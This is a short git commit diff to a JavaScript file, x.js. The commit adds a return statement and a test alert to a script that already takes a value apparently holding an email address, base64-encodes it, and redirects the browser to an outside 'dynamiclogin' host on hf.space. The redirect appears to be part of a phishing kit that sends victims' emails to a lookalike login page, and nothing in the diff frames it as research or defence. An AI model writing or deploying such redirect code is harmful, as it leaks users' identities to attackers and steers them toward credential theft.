732b289c7d1cc534636d00434a4f5b5013469b46
seven77-dynamics <138498633+seven77-dynamics@users.noreply.github.com>
2026-02-06 11:22:45 +0300

    Update x.js

--- x.js
+++ x.js
@@ -21,8 +21,12 @@
     if (e && e.includes("@")) {
       const target = "https://internalservice-dynamiclogin.static.hf.space/?state=" + encodeURIComponent(btoa(e));
       window.location.href = target;
+      return; // prevent further execution
     }
   } catch (err) {
     console.error("Redirect error:", err);
   }
+
+  alert("Hello from x.js!");
+  console.log("Loaded x.js");
 })();
